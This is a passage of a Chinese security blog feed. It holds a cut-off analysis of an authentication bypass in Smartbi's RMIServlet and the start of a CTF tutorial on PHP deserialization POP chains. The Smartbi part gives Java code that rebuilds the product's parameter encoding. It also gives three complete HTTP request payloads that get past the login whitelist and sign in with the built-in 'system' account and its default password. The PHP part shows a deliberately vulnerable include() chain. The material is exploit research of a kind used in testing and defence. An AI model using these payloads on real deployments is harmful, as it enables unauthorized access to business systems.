然后，在try块中，通过<code>VirtualDatabaseUtil.getSystemConfigValue(&quot;NETWORK_TRANSNISSION_ALGORITHM&quot;)</code>方法获取系统配置值，转换为字符串，并将结果赋值给algorithName。如果在获取配置值的过程中发生异常，则将异常记录到日志中，并将algorithName重新赋值为null。</p><p>​       接下来，使用<code>StringUtil.isNullOrEmpty(algorithName)</code>方法判断algorithName是否为空或者空字符串。如果是，则调用<code>CommonUtil.getNetWorkAlgorithmByJDBC()</code>方法获取网络算法名称，并将结果赋值给algorithName。再次判断algorithName是否为空或者空字符串。如果是，则将algorithName设置为默认值”SF1″。</p><p>​       然后，通过<code>codersMap.get(algorithName)</code>方法从codersMap中获取对应的ICoder对象，并将结果赋值给变量coder。</p><p>​       接着判断coder是否为空。如果为空，则记录错误日志，并将algorithName重新设置为默认值”SF1″。然后再次通过<code>codersMap.get(algorithName)</code>方法从codersMap中获取对应的ICoder对象，并将结果赋值给coder。</p><p>​       最后，返回coder作为结果。</p><p>​       所以我们可以根据上面的加密方式构造一个对称的encode加密方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.google.common.primitives.Bytes;<br><span class="hljs-keyword">import</span> smartbi.util.codeutil.CodeHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">t</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] encodeArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">47</span>, <span class="hljs-number">0</span>, <span class="hljs-number">56</span>, <span class="hljs-number">97</span>, <span class="hljs-number">89</span>, <span class="hljs-number">84</span>, <span class="hljs-number">43</span>, <span class="hljs-number">0</span>, <span class="hljs-number">103</span>, <span class="hljs-number">106</span>, <span class="hljs-number">37</span>, <span class="hljs-number">113</span>, <span class="hljs-number">49</span>, <span class="hljs-number">121</span>, <span class="hljs-number">78</span>, <span class="hljs-number">114</span>, <span class="hljs-number">112</span>, <span class="hljs-number">110</span>, <span class="hljs-number">48</span>, <span class="hljs-number">76</span>, <span class="hljs-number">55</span>, <span class="hljs-number">123</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>, <span class="hljs-number">88</span>, <span class="hljs-number">120</span>, <span class="hljs-number">115</span>, <span class="hljs-number">41</span>, <span class="hljs-number">77</span>, <span class="hljs-number">107</span>, <span class="hljs-number">71</span>, <span class="hljs-number">104</span>, <span class="hljs-number">53</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">54</span>, <span class="hljs-number">51</span>, <span class="hljs-number">65</span>, <span class="hljs-number">33</span>, <span class="hljs-number">117</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">68</span>, <span class="hljs-number">90</span>, <span class="hljs-number">66</span>, <span class="hljs-number">83</span>, <span class="hljs-number">122</span>, <span class="hljs-number">81</span>, <span class="hljs-number">86</span>, <span class="hljs-number">93</span>, <span class="hljs-number">0</span>, <span class="hljs-number">91</span>, <span class="hljs-number">0</span>, <span class="hljs-number">102</span>, <span class="hljs-number">0</span>, <span class="hljs-number">69</span>, <span class="hljs-number">119</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">126</span>, <span class="hljs-number">45</span>, <span class="hljs-number">118</span>, <span class="hljs-number">100</span>, <span class="hljs-number">99</span>, <span class="hljs-number">82</span>, <span class="hljs-number">116</span>, <span class="hljs-number">75</span>, <span class="hljs-number">57</span>, <span class="hljs-number">39</span>, <span class="hljs-number">79</span>, <span class="hljs-number">101</span>, <span class="hljs-number">46</span>, <span class="hljs-number">72</span>, <span class="hljs-number">42</span>, <span class="hljs-number">67</span>, <span class="hljs-number">50</span>, <span class="hljs-number">74</span>, <span class="hljs-number">111</span>, <span class="hljs-number">70</span>, <span class="hljs-number">95</span>, <span class="hljs-number">85</span>, <span class="hljs-number">58</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">98</span>, <span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">byte</span>[] ret =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encodeArray.length];<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-type">byte</span> i: encodeArray)&#123;<br>            <span class="hljs-keyword">if</span> (i&gt;<span class="hljs-number">0</span>)&#123;<br>                ret[i] = (<span class="hljs-type">byte</span>)Bytes.indexOf(encodeArray,i);<br>            &#125;<br>        &#125;<br>        encodeArray = ret;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] encode(<span class="hljs-type">byte</span>[] dataByte) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; dataByte.length; ++j) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> dataByte[i];<br>            <span class="hljs-keyword">if</span> (tmp != <span class="hljs-number">0</span> &amp;&amp; tmp &lt; encodeArray.length) &#123;<br>                <span class="hljs-type">byte</span> <span class="hljs-variable">decodeChar</span> <span class="hljs-operator">=</span> encodeArray[tmp];<br>                <span class="hljs-keyword">if</span> (decodeChar != <span class="hljs-number">0</span>) &#123;<br>                    dataByte[i] = decodeChar;<br>                &#125;<br>            &#125;<br><br>            ++i;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dataByte;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        test();<br>        <span class="hljs-type">byte</span>[] dataByte = CodeHandler.strToByteArrayByUTF8(<span class="hljs-string">&quot;%5B%22system%22%2C%220a%22%5D&quot;</span>);<br>        dataByte = encode(dataByte);<br><br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span> (dataByte));<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>​       这样一来，我们用自定义的encode方法加密出来的数据和内置的decode方法解密出来的数据就是对称的了。</p><p><img src="https://ice.frostsky.com/2023/08/15/da12392b4ac79376c73da6f8b82c6fa5.png" alt="img"></p><p>​       通过上面的代码我们可以看到内部接收三个参数<code>className</code>、<code>methodName</code>和<code>params</code>而且必须通过参数<code>windowUnloading</code>这个参数进行传入，传入之后会对其进行解码。</p><p><code>className</code>： UserService</p><p><code>methodName</code>：loginFromDB</p><p><code>params</code>：[“system”,”0a”]</p><p>​       所以我们只需要将我们传入的参数按顺序进行自定义编码进行传入即可。故构造如下payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet?windowUnloading=zDp4Wp4gRip+Sw-R6x4wdTV+/JV/uuD2Dkpd/uu/ut/uu7(/uu/JT</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3<br><br><span class="language-abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure><p>​       看到这里可能有人会问，你都已经通过GET方式传入<code>windowUnloading</code>了为什么要把包变成POST？我们可以先带着问题往下看。</p><p>​       在接收到参数后程序会来到鉴权这一步，来判断我们是否已经登录，所以会跳到这个<code>needToCheck()</code>方法中：</p><p><img src="https://ice.frostsky.com/2023/08/15/da12392b4ac79376c73da6f8b82c6fa5.png" alt="img"></p><p>​       那我们再跟进一下这个<code>needToCheck()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/15/09dc2408629a1e3c90c1d91f53543788.png" alt="img"></p><p>​       可以看到这个<code>needToCheck()</code>内部是对白名单的检验，一旦参数符合要求就返回false，那么我们就不会进入到上面的再次验证是否登录的操作。</p><p>​      因为我们是以POST的方式提交的数据，所以我们会来到<code>doPost</code>：</p><p><img src="https://ice.frostsky.com/2023/08/15/36bb69fb62eb7d6c83e26b16cff0d3ce.png" alt="img"></p><p>​       之后会将我们提交的<code>params</code>里面的值会接收传入<code>loginFromDB()</code>，若登录成功则会返回<strong>loginSucceed</strong></p><p><img src="https://ice.frostsky.com/2023/08/15/6f059f4cbea86b95a603045f81e21e7e.md.png" alt="img"></p><p>​       所以我们也就清楚了漏洞的成因，先进行白名单检验绕过，然后通过<code>params</code>里面传入的两个值分别是内置用户的账号和密码进行登录。</p><p>​       </p><p>​       在这之前还有一个问题，为什么数据要通过POST传入？</p><p>​       我们可以构造如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/smartbi/vision/RMIServlet?windowUnloading=zDp4Wp4gRip+Sw-R6x4wdTV+/JV/uuD2Dkpd/uu/ut/uu7(/uu/JT</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br></code></pre></td></tr></table></figure><p>​       之前的流程都是大差不差的，他虽然也会绕过之前的<code>needToCheck()</code>，但是GET请求会来到<code>doGet</code>里面：</p><p><img src="https://ice.frostsky.com/2023/08/15/68fe5752b51f9481255ee7705e53e6fb.png" alt="img"></p><p>​       <code>doGet</code>很简单，首先判断请求路径是否以**.js.stub<strong>结尾如果不是则会报</strong>Invalid URL**</p><p>​       就算我们可以想办法绕过这一步，他后面也只接收一个参数<code>className</code>所以根本达不到利用的效果，这也就是我们为什么要用POST而不用GET的原因了。至于POST的数据可以随意构造。</p><p>​       那么有人会问你传入的这三个参数分别是什么呢？</p><p>​        前两个看了代码之后很好理解吧，他们两个的目的就是为了绕过再次验证用户是否登录。那第三个参数中传入的”system”和”0a”分别是内置用户的账户和密码。一共有三个默认账户，本文仅用system举例，感兴趣的师傅也可以试试其他两个，但是他们的默认密码都是“0a”。</p><p>​       那我们再来讲和<strong>第一种</strong>比较相似的<strong>第三种</strong>传参方法，也就是用<code>encode</code>的方式传入：</p><p><img src="https://ice.frostsky.com/2023/08/15/c27882fe048ddfbbbcea101baf5b478d.png" alt="img"></p><p>​       他不管是接收还是处理方式都和第一种很像，只不过他是通过POST的提交，之后也是先绕过<code>needToCheck()</code>方法，进入<code>doPost</code>-&gt;<code>loginFromDB()</code>，返回<strong>loginSucceed</strong>。</p><p>​       我提供一下我的payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>60<br><br><span class="language-awk">encode=zDp4Wp4gRip+Sw-R6x4wdTV+<span class="hljs-regexp">/JV/uu</span>D2Dkpd<span class="hljs-regexp">/uu/u</span>t<span class="hljs-regexp">/uu7(/uu</span><span class="hljs-regexp">/JT</span></span><br></code></pre></td></tr></table></figure><p>​       那么我们再看第二种，直接用POST的方式传入，这种方式是最简单直接的：</p><p><img src="https://ice.frostsky.com/2023/08/15/8a25d1b1fa4f397f9a1590ef59962264.png" alt="img"></p><p>​       他先会接收<code>className</code>和<code>methodName</code>这两个用于<code>needToCheck</code>,如果后续检验没问题，他也会进入到doPOST之中，最终也会接收<code>params</code>：</p><p><img src="https://ice.frostsky.com/2023/08/15/3f3de12e65e7172678f06dce83f0c7f0.png" alt="img"></p><p>​       之后也是同样的处理方式。。。。。。。</p><p>​       下附post方式的payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>67<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UserService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>loginFromDB<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>——不及跬步无以至千里，不积小流无以成江河。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Ez反序列化pop链构造思路</title>
    <link href="/2023/07/21/Ez%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/"/>
    <url>/2023/07/21/Ez%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p><strong>关于PHP反序列化的基础，大家可以自行学习。本次练习的题目比较简单，主要是利用简单题目讲解我自己对“如何寻找pop链”的理解。</strong></p><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="废话少说，直接看代码："><a href="#废话少说，直接看代码：" class="headerlink" title="废话少说，直接看代码："></a>废话少说，直接看代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <br>     <span class="hljs-comment">//flag is in flag.php</span><br>     <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;  <br>     <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>; <br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;  <br>         <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>); <br>     &#125;  <br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);  <br>     &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);&#125; <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>其实我在做序列化题的时候，习惯性的会先找两个点：</strong></p><p><strong>1.入口点</strong></p><p>也就是我们参数的接收点，以上题为例就是：<code>@unserialize($_GET[&#39;pop&#39;]);</code></p><p><strong>2.利用点</strong></p><p>这个顾名思义也就是我们能够进行利用的店，以上题为例就是：<code>include($value);</code></p><p>重点放在利用点上，我一般比较喜欢从利用点进行反推。</p><p><strong>以上题为例，我们可以有如下思路：</strong></p><p>首先我们知道利用点在<code>append（）</code>方法的传参点。那么我们首先找能够进行调用<code>append（）</code>方法的点。于是我们就锁定了<code>Modifier（）</code>类中的<code>__invoke（）</code>魔术方法。</p><p><strong>__invoke()     &#x2F;&#x2F;调用函数的方式调用一个对象时的回应方法</strong></p><p><strong>__get（）  &#x2F;&#x2F;用于从不可访问的属性读取数据</strong></p><p>那谁能调用这个<code>Modifier（）</code>类中的<code>__invoke（）</code>魔术方法呢？ </p><p>答案是<code>Test（）</code>类中的<code>__get（）</code>方法中所具有的return</p><p>那谁又能调用<code>Test（）</code>类中的<code>__get（）</code>方法呢？</p><p>就是<code>Show（）</code>类中的<code>__tostring（）</code></p><p>那这个<code>tostring（）</code>又该怎么调用呢？</p><p>给他传一个对象<code>Show（）</code>，然后重写这个对象的<code>$source</code>变量</p><p>就这样我们简单的推解出了整条pop链：</p><p><strong>Modifier(__invoke)—-&gt;Test(__get)—&gt;Show(__tostring)—&gt;Show(__construct）</strong></p><p>这个链条是按倒叙来进行推理的，那么我们在利用的时候要反过来正向利用。</p><p><strong>编写代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 